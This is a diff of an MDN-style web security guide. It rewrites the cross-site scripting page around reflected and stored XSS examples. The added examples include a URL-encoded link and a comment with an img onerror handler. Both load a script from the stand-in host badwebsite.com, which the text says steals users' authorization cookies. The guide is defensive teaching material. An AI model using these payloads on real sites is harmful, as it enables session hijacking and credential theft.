@@ -5,128 +5,97 @@ page-type: guide
 sidebar: security
 ---
 
-A cross-site scripting (XSS) attack is one in which an attacker is able to get a target site to execute malicious code as though it was part of the website.
+A cross-site scripting (XSS) attack allows attackers to inject client-side scripts into web pages viewed by other users as if the scripts were part of the website.
+
+The term "cross-site scripting" is a misnomer: it originally referred to an attack for breaching data across websites, but over time other types of data injection attacks were included as well.
 
 ## Overview
 
-A web browser downloads code from many different websites and runs it on the user's computer. Some of these websites will be highly trustworthy, and the user may use them for sensitive operations, such as financial transactions or medical advice. With others, such as a casual gaming site, the user may have no such trust relationship. The foundation of the browser's security model is that these sites should be kept separate from each other, so code from one site should not be able to access objects or {{glossary("credential", "credentials")}} in another site. This is called the [same-origin policy](/en-US/docs/Web/Security/Defenses/Same-origin_policy).
+Websites tell browsers to download files and code from many different sources and run them on the user's machine. Sometimes these sources can perform sensitive operations like handling the user's personal information. The user can trust a specific group of sources for performing sensitive operations, for example, they may visit a bank or medical website to perform financial transactions. Other sources, like casual gaming websites, do not necessarily have a trust relationship between the user. The foundation of a browser's security model is that trusted and untrusted sites should be separated from each other, so a trusted site cannot use objects or {{glossary("credential", "credentials")}} from an untrusted site, and vice versa. This is called the [same-origin policy (SOP)](/en-US/docs/Web/Security/Defenses/Same-origin_policy).
 
-![Diagram of 2 sites in the browsers, in separate worlds](same-origin.svg)
+![Diagram of two sites in the browsers, in separate worlds](same-origin.svg)
 
-In a successful XSS attack, the attacker is able to subvert the same-origin policy by tricking the target site into executing malicious code within its own context, as though it were same-origin. The code can then do anything that the site's own code can do, including, for example:
+Cross-site scripting attacks are designed to subvert the same-origin policy by tricking the target site into executing untrusted code within its own context, as if it were same-origin. The code can then do anything that the site's own code can do, including:
 
-- Access and/or modify all the content of the site's loaded pages, and any content in local storage
-- Make HTTP requests with the user's credentials, enabling them to impersonate the user or access sensitive data
+- Accessing and/or modifying all the content of the site's loaded pages, and any content in local storage
+- Make HTTP requests with the user's credentials, enabling the attacker to impersonate the user or access sensitive data
 
 ![Diagram of attacker code running in target website](xss.svg)
 
 All XSS attacks depend on a website doing two things:
 
 1. Accepting some input that could have been crafted by an attacker
-2. Including this input in a page without _sanitizing_ it: that is, without ensuring that it won't be executable as JavaScript.
+2. Including this input in a page without _sanitizing_ the content, i.e., without ensuring that it can't be executed as JavaScript
 
-## Two XSS examples
+## Types
 
-In this section we'll go through two example pages that are vulnerable to an XSS attack.
+There is no standard classification of cross-site scripting vulnerabilities, but most experts distinguish between two primary types of XSS flaws: _non-persistent (reflected)_ and _persistent (stored)_. These two types can be divided further into _client-side_ and _server-side_ vulnerabilities.
 
-### Code injection in the browser
+This section will discuss non-persistent and persistent flaws and their potential impacts for developers and users.
 
-In this example, suppose the website for the user's bank is `my-bank.example.com`. The user is typically signed into it, and code in the website can access the user's account details and perform transactions. The website wants to display a welcome message, personalized for the current user. It displays the welcome in a {{htmlelement("Heading_Elements", "heading")}} element:
+### Non-persistent
+
+Non-persistent (or reflected) XSS attacks occur when data from a web-client (usually HTTP query parameters) is used immediately by server-side scripts to parse and display a page of results for the user, without properly sanitizing the content.
+
+#### Example
+
+Suppose a the website for a streaming service is `streaming-tv.com`. The website requires a username and password and handles sensitive data, including the user's billing information. When the user is logged in, an authorization cookie is created in the browser so that both the client and server know the user's status.
+
+Now, suppose that an attacker discovers a reflected XSS vulnerability on the site. The website includes a search feature, and if a query with no matching titles is submitted, the results page will display "No results for: " followed by the query.
 
 ```html
-<h1 id="welcome"></h1>
+<h1 id="heading">No results for:</h1>
 ```
 
-The page expects to find the current user's name in a [URL parameter](/en-US/docs/Learn_web_development/Howto/Web_mechanics/What_is_a_URL#parameters). It extracts the parameter value, and uses the value to create a personalized greeting message:
+The page expects to find the given query as a [URL parameter](/en-US/docs/Learn_web_development/Howto/Web_mechanics/What_is_a_URL#parameters). It extracts the parameter value, and uses the value to display the query as shown:
 
 ```js
 const params = new URLSearchParams(window.location.search);
-const user = params.get("user");
-const welcome = document.querySelector("#welcome");
+const query = params.get("q");
+const heading = document.querySelector("#heading");
 
-welcome.innerHTML = `Welcome back, ${user}!`;
+heading.innerHTML = `No results for: ${query}`;
 ```
 
-Let's say this page is served from `https://my-bank.example.com/welcome`. To exploit the vulnerability, an attacker sends the user a link like this:
+Because of this, whenever a search query is entered, the streaming website's URL changes to include the search term as a parameter. For example, searching "no results" changes the URL to `streaming-tv.com/search?q=no%20results`.
+
+The attacker discovers that submitting an abnormal search query like `<script>alert("xss");</script>` causes the query to be parsed as HTML and/or JavaScript. In this case, the attacker's query results in an alert box with "xss" appearing on the results page followed by the page displaying no results for an empty query. The URL therefore becomes `streaming-tv.com/search?q=<script>alert("xss");</script>`, which is exploitable behavior.
+
+To exploit the vulnerability, the attacker sends the user a link like this:
 
 ```html
-<a
-  href="https://my-bank.example.com/welcome?user=<img src=x onerror=alert('hello!')>">
-  Get a free kitten!</a
->
+<a href="https://streaming-tv.com/search?q=your%20favorite%20show%3Cscript%20src%3D%22http%3A%2F%2Fbadwebsite.com%2Fauth.js%22%3E%3C%2Fscript%3E">
+  Watch NEW episodes of Your Favorite Show!
+</a>
 ```
 
-When the user clicks the link:
+The user sees this link and clicks it, only to find that the streaming service doesn't have their favorite show. However, right in the middle, the invisible `<script>` tag runs the attacker's `auth.js` script which sends a copy the user's authorization cookie to the harmful website's servers. This could allow the attacker to log in as the victim and access their sensitive information. The attacker could also perform this same stunt on the website's developers and thus gain administrative privileges to the website.
 
-1. The browser loads the page.
-2. The page extracts the URL parameter named `user`, whose value is `<img src=x onerror=alert("hello!")>`.
-3. The page then assigns this value to the `welcome` element's `innerHTML` property, which creates a new {{htmlelement("img")}} element, which has a `src` attribute value of `x`.
-4. Since the `src` value generates an error, the `onerror` [event handler property](/en-US/docs/Learn_web_development/Core/Scripting/Events#inline_event_handlers_%e2%80%94_dont_use_these) is executed, and the attacker gets to run its code in the page.
+### Persistent
 
-In this case the code just displays an alert, but in a real banking website, the attacker code would be able to do anything that the bank's own front-end code could.
+Persistent vulnerabilities are a more powerful type of XSS in which a website's server saves data from an attacker, and such data is permanently displayed on the website without proper sanitization.
 
-### Code injection in the server
+#### Example
 
-In this example, consider a website with a search function. The HTML for the search page might look like this:
+A news website allows logged-in users to comment on articles. The website uses a rich text editor for comment input which also supports HTML formatting.
+
+An attacker discovers that using any JavaScript attribute inside of a comment allows the written JavaScript to be executed by the browser. For example, a comment like
 
 ```html
-<h1>Search</h1>
-
-<form action="/results">
-  <label for="mySearch">Search for an item:</label>
-  <input id="mySearch" type="search" name="search" />
-  <input type="submit" />
-</form>
+I feel so bad for him; why couldn't he just live healthier?
+<img onload="alert('xss')" src="sad_emoji.png" />
 ```
 
-When the user enters a search term and clicks "Submit", the browser makes a GET request to "/results", including the search term as a URL parameter, like this:
+will result in the comment's text being visible along with an "xss" alert box.
 
-```plain
-https://example.org/results?search=bananas
-```
-
-The server wants to display a list of search results, with a title indicating what the user searched for. It extracts the search term from the URL parameter. Here's what this might look like in [Express](/en-US/docs/Learn_web_development/Extensions/Server-side/Express_Nodejs):
-
-```js
-app.get("/results", (req, res) => {
-  const searchQuery = req.query.search;
-  const results = getResults(searchQuery); // Implementation not shown
-  res.send(`
-   <h1>You searched for ${searchQuery}</h1>
-   <p>Here are the results: ${results}</p>`);
-});
-```
-
-To exploit this vulnerability, an attacker sends the user a link like this:
+To exploit this vulnerability, the attacker posts the following malicious comment:
 
 ```html
-<a href="http://example.org/results?search=<img src=x onerror=alert('hello')">
-  Get a free kitten!</a
->
+I feel so bad for him; why couldn't he just live healthier?
+<img src=x onerror="const s = document.createElement('script'); s.setAttribute('src', 'http://badwebsite.com/auth.js'); document.body.appendChild(s);" />
 ```
 
-When the user clicks the link:
-
-1. The browser sends a GET request to the server. The request's URL parameter contains the malicious code.
-2. The server extracts the URL parameter value and embeds it in the page.
-3. The server returns the page to the browser, which runs it.
-
-## Anatomy of an XSS attack
-
-Like all XSS attacks, these two examples are possible because the website:
-
-1. Uses input that could have been crafted by an attacker
-2. Includes the input in the page without sanitizing it.
-
-Both these examples use the same vector for the malicious input: the URL parameter. However, there are other vectors that attackers can use.
-
-For example, consider a blog with comments. In a case like this, the website:
-
-1. Allows anyone to submit comments using a {{htmlelement("form")}} element
-2. Stores the comments in a database
-3. Includes the comments in pages that the website serves to other users.
-
-If the comments are not sanitized, then they are potential vectors for XSS. This kind of attack is sometimes called _stored_ or _persistent_ XSS, and is particularly severe, because the infected content will be served to all users who access the page, every time they access it.
+Since the `src` attribute of the {{htmlelement("img")}} element generates an error, it causes the browser to create a new script with the attacker's harmful code. Anyone visiting the news article now risks having their credentials and sensitive information stolen by the attacker.
 
 ### Client and server XSS
 
